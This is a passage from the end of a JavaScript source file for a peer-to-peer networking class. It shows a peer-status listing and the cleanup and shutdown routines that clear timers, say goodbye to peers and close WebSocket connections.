        discoveryInterval: this.p2pConfig.discoveryInterval
      },
      connectedPeers: Array.from(this.peers.entries()).map(([nodeId, peer]) => ({
        nodeId,
        ip: peer.ip,
        port: peer.port,
        direct: peer.direct,
        lastSeen: peer.lastSeen,
        lastHeartbeat: peer.lastHeartbeat,
        messagesReceived: peer.messagesReceived,
        messagesSent: peer.messagesSent,
        connectedAt: peer.connectedAt,
        uptime: Date.now() - peer.connectedAt,
        capabilities: peer.capabilities
      })),
      knownPeers: Array.from(this.knownPeers.values()).map(peer => ({
        nodeId: peer.nodeId,
        ip: peer.ip,
        port: peer.port,
        mode: peer.mode,
        reachable: peer.reachable,
        connected: this.peers.has(peer.nodeId),
        locked: this.connectionLocks.has(peer.nodeId),
        blacklisted: this.isBlacklisted(peer.nodeId)
      }))
    };
  }
  
  cleanup() {
    if (this.wss) {
      try {
        this.wss.close();
      } catch (e) {}
      this.wss = null;
    }
    this.isServerReady = false;
  }
  
  shutdown() {
    console.log('[P2P] Shutting down P2P node...');
    this.isShuttingDown = true;
    
    if (this.discoveryInterval) {
      clearInterval(this.discoveryInterval);
      this.discoveryInterval = null;
    }
    if (this.peerCleanupInterval) {
      clearInterval(this.peerCleanupInterval);
      this.peerCleanupInterval = null;
    }
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
    if (this.autoConnectInterval) {
      clearInterval(this.autoConnectInterval);
      this.autoConnectInterval = null;
    }
    
    for (const [key, handler] of this.requestHandlers) {
      const eventType = key.split('_').slice(0, -1).join('_') + '_response';
      this.removeListener(eventType, handler);
    }
    this.requestHandlers.clear();
    
    for (const [nodeId, peer] of this.peers) {
      try {
        this.sendToPeer(nodeId, {
          type: 'goodbye',
          nodeId: this.nodeId,
          timestamp: Date.now()
        });
        
        setTimeout(() => {
          try {
            peer.ws.close();
          } catch (e) {}
        }, 500);
        
      } catch (e) {}
    }
    
    setTimeout(() => {
      this.peers.clear();
      this.knownPeers.clear();
      this.connectionLocks.clear();
      this.messageQueue.clear();
      this.peerBlacklist.clear();
    }, 1000);
    
    this.cleanup();
    this.removeAllListeners();
    
    console.log('[P2P] P2P node shutdown complete');
  }
}

export default P2PHybridNode;
